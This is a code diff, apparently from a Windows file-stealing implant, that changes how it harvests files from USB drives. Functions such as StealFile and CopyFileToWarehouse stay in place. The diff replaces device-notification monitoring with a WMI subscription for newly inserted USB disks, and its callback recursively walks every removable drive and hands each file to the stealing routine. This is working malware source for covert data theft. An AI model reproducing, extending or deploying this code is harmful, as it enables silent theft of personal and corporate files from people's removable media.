@@ -110,17 +110,17 @@ VOID FreeGlobalConfig
 			FREE(pConfig->ArchiveExtensions);
 		}
 		
-		if (pConfig->MonitoredFolder != NULL) {
+		/*if (pConfig->MonitoredFolder != NULL) {
 			for (i = 0; i < pConfig->dwNumberOfMonitoredFolder; i++) {
 				FREE(pConfig->MonitoredFolder[i]);
 			}
 
 			FREE(pConfig->MonitoredFolder);
-		}
+		}*/
 
-		if (pConfig->hDevNotify != NULL) {
+		/*if (pConfig->hDevNotify != NULL) {
 			UnregisterDeviceNotification(pConfig->hDevNotify);
-		}
+		}*/
 		
 		FREE(pConfig);
 	}
@@ -1422,6 +1422,7 @@ VOID CopyFileToWarehouse
 	DWORD dwNumberOfFreeClusters = 0;
 	DWORD dwTotalNumberOfClusters = 0;
 	UINT64 uPercentFull = 0;
+	DWORD dwDriveType = 0;
 
 	PrintFormatW(L"%s\n", lpPath);
 	lpWarehouse = DuplicateStrW(pConfig->wszWarehouse, SHA256_HASH_SIZE + 1);
@@ -1431,6 +1432,11 @@ VOID CopyFileToWarehouse
 	}
 
 	wszDriveName[0] += PathGetDriveNumberW(lpWarehouse);
+	dwDriveType = GetDriveTypeW(wszDriveName);
+	if (dwDriveType == DRIVE_REMOVABLE) {
+		goto CLEANUP;
+	}
+
 	if (!GetDiskFreeSpaceW(wszDriveName, &dwSectorsPerCluster, &dwBytesPerSector, &dwNumberOfFreeClusters, &dwTotalNumberOfClusters)) {
 		LOG_ERROR("GetDiskFreeSpaceW", GetLastError());
 		goto CLEANUP;
@@ -1514,7 +1520,6 @@ BOOL StealFile
 					break;
 				}
 
-				PrintFormatW(L"Zip file: %s\n", lpPath);
 				ItemList = ExtractFromZip(lpPath, NULL, FALSE, &dwNumberOfItems);
 				if (ItemList == NULL) {
 					continue;
@@ -1584,22 +1589,55 @@ CLEANUP:
 	return;
 }
 
-VOID MonitorAndLoot
+//VOID MonitorAndLoot
+//(
+//	_In_ PGLOBAL_CONFIG pConfig
+//)
+//{
+//	PLOOT_ARGS pLootParameter = NULL;
+//	DWORD dwThreadID = 0;
+//	DWORD i = 0;
+//
+//	pConfig->StoppingMonitor = FALSE;
+//	for (i = 0; i < pConfig->dwNumberOfMonitoredFolder; i++) {
+//		pLootParameter = ALLOC(sizeof(LOOT_ARGS));
+//		pLootParameter->lpPath = DuplicateStrW(pConfig->MonitoredFolder[i], 0);
+//		pLootParameter->pConfig = pConfig;
+//		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFileThread, pLootParameter, 0, &dwThreadID);
+//	}
+//}
+
+VOID MonitorUsbCallback
 (
+	_In_ BSTR lpInput,
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
-	PLOOT_ARGS pLootParameter = NULL;
-	DWORD dwThreadID = 0;
+	WCHAR wszDriveList[0x100];
+	DWORD dwLength = 0;
 	DWORD i = 0;
+	LPWSTR lpLogicalDrive = NULL;
+	DWORD dwDriveType = 0;
 
-	pConfig->StoppingMonitor = FALSE;
-	for (i = 0; i < pConfig->dwNumberOfMonitoredFolder; i++) {
-		pLootParameter = ALLOC(sizeof(LOOT_ARGS));
-		pLootParameter->lpPath = DuplicateStrW(pConfig->MonitoredFolder[i], 0);
-		pLootParameter->pConfig = pConfig;
-		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFileThread, pLootParameter, 0, &dwThreadID);
+	SearchMatchStrW(lpInput, L"DeviceID = \"\\\\\\\\.\\\\PHYSICALDRIVE", L"\";\n");
+	dwLength = GetLogicalDriveStringsW(_countof(wszDriveList), wszDriveList);
+	if (dwLength == 0) {
+		LOG_ERROR("GetLogicalDriveStringsW", GetLastError());
+		goto CLEANUP;
 	}
+
+	lpLogicalDrive = wszDriveList;
+	while (i < dwLength) {
+		dwDriveType = GetDriveTypeW(lpLogicalDrive);
+		if (dwDriveType == DRIVE_REMOVABLE) {
+			ListFileEx(lpLogicalDrive, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
+		}
+
+		i += lstrlenW(lpLogicalDrive) + 1;
+	}
+
+CLEANUP:
+	return;
 }
 
 VOID MonitorUsb
@@ -1607,7 +1645,7 @@ VOID MonitorUsb
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
-	DEV_BROADCAST_DEVICEINTERFACE_W DeviceInterface;
+	/*DEV_BROADCAST_DEVICEINTERFACE_W DeviceInterface;
 	HDEVNOTIFY hNotify = NULL;
 	GUID UsbDeviceGUID = { 0xA5DCBF10L, 0x6530, 0x11D2, { 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED } };
 
@@ -1624,7 +1662,11 @@ VOID MonitorUsb
 
 	pConfig->hDevNotify = hNotify;
 CLEANUP:
-	return;
+	return;*/
+	while (TRUE) {
+		RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", MonitorUsbCallback, pConfig);
+		Sleep(60000);
+	}
 }
 
 VOID LootFile
